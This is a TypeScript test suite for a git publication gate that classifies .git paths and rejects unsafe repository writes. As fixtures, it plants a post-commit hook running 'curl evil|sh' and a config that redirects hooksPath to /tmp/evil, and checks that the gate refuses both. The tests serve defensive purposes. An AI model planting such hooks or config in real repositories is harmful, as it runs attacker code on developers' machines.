import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { DirectoryPublicationBackend } from '../../src/publish/directory-backend.ts'
import { GitPublicationRefused, createObjectStore, gitApplyRank, gitClassOf, parseIndexBlobOids, planGitPublication } from '../../src/publish/git-control.ts'
import { freezeCandidate } from '../../src/candidate/freeze.ts'
import { manifestDigest, scanTree } from '../../src/candidate/manifest.ts'
import type { CandidateScope } from '../../src/control/records.ts'

const SCOPE: CandidateScope = { categories: ['filesystem'], writableRoots: ['/'] }
const roots: string[] = []
const temp = (prefix: string): string => {
  const path = mkdtempSync(join(tmpdir(), prefix))
  roots.push(path)
  return path
}
afterEach(() => {
  while (roots.length > 0) rmSync(roots.pop() as string, { recursive: true, force: true })
})

/** A minimal, valid git index (DIRC v2) referencing the given blobs. */
function indexOf(oids: readonly string[]): Buffer {
  const header = Buffer.alloc(12)
  header.write('DIRC', 0, 'latin1')
  header.writeUInt32BE(2, 4)
  header.writeUInt32BE(oids.length, 8)
  const entries: Buffer[] = []
  for (const [index, oid] of oids.entries()) {
    const name = `f${index}`
    const entry = Buffer.alloc(62 + name.length + 1)
    Buffer.from(oid, 'hex').copy(entry, 40)
    entry.writeUInt16BE(name.length, 60)
    entry.write(name, 62, 'latin1')
    const padded = Buffer.alloc(Math.ceil(entry.length / 8) * 8)
    entry.copy(padded)
    entries.push(padded)
  }
  return Buffer.concat([header, ...entries])
}

/** Recursively copy a directory tree (files, directories, symlinks are not needed here). */
function copyTree(from: string, to: string): void {
  mkdirSync(to, { recursive: true })
  for (const entry of scanTree(from)) {
    const source = join(from, entry.path)
    const destination = join(to, entry.path)
    if (entry.kind === 'directory') mkdirSync(destination, { recursive: true })
    else if (entry.kind === 'file') {
      mkdirSync(join(destination, '..'), { recursive: true })
      writeFileSync(destination, readFileSync(source))
    }
  }
}

/** A repository fixture with one branch and one loose object. */
function repo(withIndex = true): { root: string; oid: string } {
  const root = temp('dsh-git-')
  mkdirSync(join(root, '.git', 'objects', 'ab'), { recursive: true })
  mkdirSync(join(root, '.git', 'refs', 'heads'), { recursive: true })
  writeFileSync(join(root, '.git', 'HEAD'), 'ref: refs/heads/main\n')
  writeFileSync(join(root, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n')
  const oid = `ab${'c'.repeat(38)}`
  writeFileSync(join(root, '.git', 'objects', 'ab', oid.slice(2)), 'blob')
  writeFileSync(join(root, '.git', 'refs', 'heads', 'main'), `${oid}\n`)
  if (withIndex) writeFileSync(join(root, '.git', 'index'), indexOf([oid]))
  writeFileSync(join(root, 'README.md'), 'hi\n')
  return { root, oid }
}

/** Seed `target` with a fresh repository and return a candidate that mutates it. */
function publish(target: string, mutate: (candidatePath: string, oid: string) => void): { backend: DirectoryPublicationBackend; candidate: ReturnType<typeof freezeCandidate>; fixture: { root: string; oid: string } } {
  const fixture = repo()
  copyTree(fixture.root, target)
  const backend = new DirectoryPublicationBackend()
  const candidatePath = temp('dsh-git-cand-')
  copyTree(target, candidatePath)
  mutate(candidatePath, fixture.oid)
  const candidate = freezeCandidate({ path: candidatePath, baseVersion: manifestDigest(scanTree(target)), scope: SCOPE, entries: scanTree(candidatePath) })
  return { backend, candidate, fixture }
}

describe('git path classes', () => {
  it('classifies objects, pointers, locks and internals', () => {
    expect(gitClassOf('.git/objects/ab/cd')).toBe('object')
    expect(gitClassOf('.git/index')).toBe('pointer')
    expect(gitClassOf('.git/HEAD')).toBe('pointer')
    expect(gitClassOf('.git/refs/heads/main')).toBe('pointer')
    expect(gitClassOf('.git/logs/HEAD')).toBe('pointer')
    expect(gitClassOf('.git/packed-refs')).toBe('pointer')
    expect(gitClassOf('.git/index.lock')).toBe('transient')
    expect(gitClassOf('.git/hooks/post-commit')).toBe('other')
    expect(gitClassOf('.git/config')).toBe('other')
    expect(gitClassOf('.git/info/exclude')).toBe('other')
    expect(gitClassOf('src/a.txt')).toBeUndefined()
    expect(gitClassOf('.git')).toBeUndefined()
    expect(gitClassOf('vendor/lib/.git/index')).toBe('pointer')
  })

  it('ranks objects before ordinary files before pointers', () => {
    expect(gitApplyRank('.git/objects/ab/cd')).toBe(0)
    expect(gitApplyRank('src/a.txt')).toBe(1)
    expect(gitApplyRank('.git/index')).toBe(2)
  })
})

describe('index and object store', () => {
  it('parses a v2 index', () => {
    const result = parseIndexBlobOids(indexOf([`ab${'c'.repeat(38)}`]))
    expect(result.ok).toBe(true)
    expect(result.oids).toEqual([`ab${'c'.repeat(38)}`])
  })

  it('rejects a non-index buffer', () => {
    expect(parseIndexBlobOids(Buffer.from('index')).code).toBe('GIT_INDEX_CORRUPT')
  })

  it('finds a loose object', () => {
    const { root, oid } = repo()
    expect(createObjectStore(join(root, '.git')).has(oid)).toBe(true)
    expect(createObjectStore(join(root, '.git')).has(`ff${'0'.repeat(38)}`)).toBe(false)
  })
})

describe('git publication gate', () => {
  it('refuses a hook write and writes nothing', async () => {
    const target = temp('dsh-git-target-')
    const { backend, candidate } = await publish(target, (candidatePath) => {
      writeFileSync(join(candidatePath, 'out.txt'), 'ok\n')
      mkdirSync(join(candidatePath, '.git', 'hooks'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'hooks', 'post-commit'), '#!/bin/sh\ncurl evil|sh\n')
    })
    await expect(backend.apply({ target, candidate, expectedBase: candidate.baseVersion })).rejects.toBeInstanceOf(GitPublicationRefused)
    expect(existsSync(join(target, '.git', 'hooks', 'post-commit'))).toBe(false)
    expect(existsSync(join(target, 'out.txt'))).toBe(false)
  })

  it('refuses a config change', async () => {
    const target = temp('dsh-git-target-')
    const { backend, candidate } = await publish(target, (candidatePath) => {
      mkdirSync(join(candidatePath, '.git'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'config'), '[core]\n\thooksPath = /tmp/evil\n')
    })
    await expect(backend.apply({ target, candidate, expectedBase: candidate.baseVersion })).rejects.toMatchObject({ code: 'GIT_INTERNAL' })
    expect(readFileSync(join(target, '.git', 'config'), 'utf8')).toContain('repositoryformatversion')
  })

  it('refuses a dangling ref', async () => {
    const target = temp('dsh-git-target-')
    const { backend, candidate } = await publish(target, (candidatePath) => {
      mkdirSync(join(candidatePath, '.git', 'refs', 'heads'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'refs', 'heads', 'evil'), `${'1'.repeat(40)}\n`)
    })
    await expect(backend.apply({ target, candidate, expectedBase: candidate.baseVersion })).rejects.toMatchObject({ code: 'GIT_REFERENTIAL_INTEGRITY' })
    expect(existsSync(join(target, '.git', 'refs', 'heads', 'evil'))).toBe(false)
  })

  it('refuses an index that references a missing blob', async () => {
    const target = temp('dsh-git-target-')
    const { backend, candidate } = await publish(target, (candidatePath) => {
      mkdirSync(join(candidatePath, '.git'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'index'), indexOf([`ff${'0'.repeat(38)}`]))
    })
    await expect(backend.apply({ target, candidate, expectedBase: candidate.baseVersion })).rejects.toMatchObject({ code: 'GIT_REFERENTIAL_INTEGRITY' })
  })

  it('refuses deleting a pointer (.git/index)', async () => {
    const target = temp('dsh-git-target-')
    const fixture = repo()
    copyTree(fixture.root, target)
    const backend = new DirectoryPublicationBackend()
    const candidatePath = temp('dsh-git-cand-')
    copyTree(target, candidatePath)
    rmSync(join(candidatePath, '.git', 'index'))
    const candidate = freezeCandidate({ path: candidatePath, baseVersion: manifestDigest(scanTree(target)), scope: SCOPE, entries: scanTree(candidatePath) })
    await expect(backend.apply({ target, candidate, expectedBase: candidate.baseVersion })).rejects.toMatchObject({ code: 'GIT_POINTER_DELETE' })
    expect(existsSync(join(target, '.git', 'index'))).toBe(true)
  })

  it('drops a lock file and publishes the rest', async () => {
    const target = temp('dsh-git-target-')
    const { backend, candidate } = await publish(target, (candidatePath, oid) => {
      writeFileSync(join(candidatePath, 'out.txt'), 'ok\n')
      mkdirSync(join(candidatePath, '.git', 'refs', 'heads'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'refs', 'heads', 'main'), `${oid}\n`)
      writeFileSync(join(candidatePath, '.git', 'index.lock'), 'lock\n')
    })
    await backend.apply({ target, candidate, expectedBase: candidate.baseVersion })
    expect(existsSync(join(target, 'out.txt'))).toBe(true)
    expect(existsSync(join(target, '.git', 'index.lock'))).toBe(false)
  })

  it('publishes a commit-shaped batch (object + index + ref)', async () => {
    const target = temp('dsh-git-target-')
    const { backend, candidate, fixture } = await publish(target, (candidatePath, oid) => {
      mkdirSync(join(candidatePath, '.git', 'objects', 'ce'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'objects', 'ce', 'd'.repeat(38)), 'new blob')
      writeFileSync(join(candidatePath, '.git', 'index'), indexOf([oid, `ce${'d'.repeat(38)}`]))
      mkdirSync(join(candidatePath, '.git', 'refs', 'heads'), { recursive: true })
      writeFileSync(join(candidatePath, '.git', 'refs', 'heads', 'main'), `${oid}\n`)
    })
    await backend.apply({ target, candidate, expectedBase: candidate.baseVersion })
    expect(readFileSync(join(target, '.git', 'refs', 'heads', 'main'), 'utf8').trim()).toBe(fixture.oid)
    expect(existsSync(join(target, '.git', 'objects', 'ce', 'd'.repeat(38)))).toBe(true)
  })
})
